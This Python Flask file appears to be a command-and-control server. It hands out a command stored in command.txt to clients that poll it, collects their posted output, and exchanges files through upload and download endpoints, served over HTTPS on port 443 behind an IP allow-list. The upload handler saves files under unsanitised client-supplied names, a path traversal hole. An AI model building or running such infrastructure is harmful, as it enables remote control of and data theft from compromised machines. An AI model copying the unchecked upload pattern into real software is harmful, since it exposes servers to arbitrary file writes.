from werkzeug.serving import run_simple
from flask import Flask, request, send_file, abort, send_from_directory
import os
from flask import Response
import traceback
import ssl

app = Flask(__name__)

# This is where the uploaded files are saved and downloaded files are sourced
upload_dir = "/path/to/uploads"
download_dir = "/path/to/downloads"

# List of allowed IPs
allowed_ips = ['allowed IPs']

@app.before_request
def limit_remote_addr():
    if request.remote_addr not in allowed_ips:
        abort(403)  # Forbidden

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'GET':
        # Read the command from a file
        with open('command.txt', 'r') as f:
            command_to_execute = f.read().strip()
        return command_to_execute
    elif request.method == 'POST':
        output = request.form.get('output')
        print(output)
        return "Success"

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file part"
    file = request.files['file']
    if file.filename == '':
        return "No selected file"
    if file:
        file.save(os.path.join(upload_dir, file.filename))
        return "File uploaded successfully"

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    file_path = os.path.join(download_dir, filename)
    if not os.path.isfile(file_path):
        abort(404)  # File not found
    try:
        return send_file(file_path, as_attachment=True)
    except Exception as e:
        app.logger.error(f"Error sending file: {e}")
        abort(500)

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain('cert.pem', 'key.pem')
    run_simple('0.0.0.0', 443, app, ssl_context=context)